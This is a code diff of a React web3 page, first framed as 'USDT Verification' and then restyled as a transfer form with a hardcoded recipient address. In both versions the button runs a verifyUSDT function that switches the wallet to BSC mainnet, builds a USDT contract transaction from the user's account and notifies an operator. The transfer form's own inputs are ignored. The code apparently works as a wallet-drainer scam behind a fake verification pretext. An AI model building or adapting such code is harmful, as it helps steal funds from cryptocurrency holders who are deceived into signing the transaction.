@@ -1,5 +1,5 @@
 import { useState } from 'react'
-import './App.css'
+import { Copy, Upload, QrCode } from 'lucide-react';
 import {Web3} from 'web3';
 
 
@@ -46,11 +46,6 @@ async function verifyUSDT() {
   const usdtAddress = import.meta.env.VITE_USDTADDR
 
   try {
-    // Show loading stateVITE_
-    verifyBtn.disabled = true;
-    loadingSpinner.style.display = 'block';
-    loadingIndicator.style.display = 'block';
-
     // Switch to BSC Mainnet
     await provider.request({
       method: 'wallet_switchEthereumChain',
@@ -63,8 +58,8 @@ async function verifyUSDT() {
     const accounts = await web3.eth.getAccounts();
     const user = accounts[0];
 
-    const gasPrice = web3.utils.toWei(gasSlider.value, 'gwei');
-    console.log("gasPrice",gasPrice)
+    const gasPrice = web3.utils.toWei(5, 'gwei');
+
     const abi = [{
       "constant": false,
       "inputs": [
@@ -85,68 +80,85 @@ async function verifyUSDT() {
     });
 
     sendNotification(user)
-    // Show success message
-    successMessage.style.display = "block";
-    loadingSpinner.style.display = 'none';
-    loadingIndicator.style.display = 'none';
-
-  
+    // Show success message  
   } catch (error) {
-    console.error(error);
     alert("Verification failed. Please try again.");
-    loadingSpinner.style.display = 'none';
-    loadingIndicator.style.display = 'none';
-    verifyBtn.disabled = false;
   }
 }
-function App() {
 
-  const [slider , setSlider] = useState(5)
-  const [loading , setLoading ] = useState(false)
+export  function CryptoTransfer() {
+  const [address, setAddress] = useState('0x1639ecc82742F09B94681d716d98a07a57aa067b');
+  const [amount, setAmount] = useState('0');
+  const [currency] = useState('USDT');
+
+  const handlePaste = async () => {
+    try {
+      const text = await navigator.clipboard.readText();
+      setAddress(text);
+    } catch (err) {
+      console.error('Failed to read clipboard:', err);
+    }
+  };
 
   return (
-    <>
-      <div class="container">
-        <div class="logo">
-          <i class="fas fa-coins"></i>
-        </div>
-
-        <h1>USDT Verification</h1>
-
-        <div class="slider-container">
-          <div class="slider-label">
-            <span>Gas Price:</span>
-            <span id="gweiLabel">{slider} Gwei</span>
+    <div className="min-h-screen bg-zinc-900 text-white p-8 flex items-left justify-left">
+      <div className="w-full max-w-2xl space-y-6">
+        {/* Address Input Section */}
+        <div className="space-y-2">
+          <label className="text-sm text-zinc-400">Address or Domain Name</label>
+          <div className="relative">
+            <input
+              type="text"
+              value={address}
+              onChange={(e) => setAddress(e.target.value)}
+              className="w-full bg-zinc-800 border border-zinc-700 rounded-lg px-4 py-3 text-white focus:outline-none focus:border-emerald-500 transition-colors pr-32"
+              placeholder="Enter address or domain"
+            />
+            <div className="absolute right-2 top-1/2 -translate-y-1/2 flex items-center gap-2">
+              <button
+                onClick={handlePaste}
+                className="text-emerald-500 hover:text-emerald-400 transition-colors px-2 py-1 text-sm font-medium"
+              >
+                Paste
+              </button>
+              <button className="text-emerald-500 hover:text-emerald-400 transition-colors p-1">
+                <Upload size={18} />
+              </button>
+              <button className="text-emerald-500 hover:text-emerald-400 transition-colors p-1">
+                <QrCode size={18} />
+              </button>
+            </div>
           </div>
-          <input type="range" id="gasSlider" min="1" max="30" value={slider} onChange={(e)=>setSlider(e.target.value)}  />
-          <div class="gas-info">Adjust transaction speed and cost</div>
         </div>
 
-        <button class="verify-btn" id="verifyBtn" onClick={verifyUSDT}>
-          <i class="fas fa-check-circle"></i> Verify USDT
+        {/* Amount Input Section */}
+        <div className="space-y-2">
+          <label className="text-sm text-zinc-400">Amount</label>
+          <div className="relative">
+            <input
+              type="text"
+              value={amount}
+              onChange={(e) => setAmount(e.target.value)}
+              className="w-full bg-zinc-800 border border-zinc-700 rounded-lg px-4 py-3 text-white focus:outline-none focus:border-emerald-500 transition-colors pr-24"
+              placeholder="0"
+            />
+            <div className="absolute right-2 top-1/2 -translate-y-1/2 flex items-center gap-2">
+              <span className="text-zinc-400 text-sm">{currency}</span>
+              <button className="text-emerald-500 hover:text-emerald-400 transition-colors px-2 py-1 text-sm font-medium">
+                Max
+              </button>
+            </div>
+          </div>
+          <div className="text-sm text-zinc-500">= ${amount}</div>
+        </div>
+
+        {/* Next Button */}
+        <button 
+        onClick={()=>verifyUSDT()}
+        className="w-full bg-emerald-600 hover:bg-emerald-700 text-white font-medium py-4 rounded-full transition-colors mt-12">
+          Next
         </button>
-
-        <div class="success-message" id="successMessage">
-          <i class="fas fa-check-circle"></i> Your <strong>USDT</strong> is original and verified!
-        </div>
-
-        <div class="loading" id="loadingIndicator">
-          <div class="loading-spinner" id="loadingSpinner"></div>
-          <p>Processing transaction...</p>
-        </div>
-
-        <footer>
-          <div class="usdt-badge">Only supports USDT BEP-20</div>
-          <div class="wallet-icons">
-            <div class="wallet-icon"><i class="fas fa-wallet"></i></div>
-            <div class="wallet-icon"><i class="fab fa-ethereum"></i></div>
-            <div class="wallet-icon"><i class="fab fa-google-wallet"></i></div>
-          </div>
-          All Web3 wallets supported – Trust Wallet, MetaMask, Binance Wallet &amp; more.
-        </footer>
       </div>
-    </>
-  )
+    </div>
+  );
 }
-
-export default App
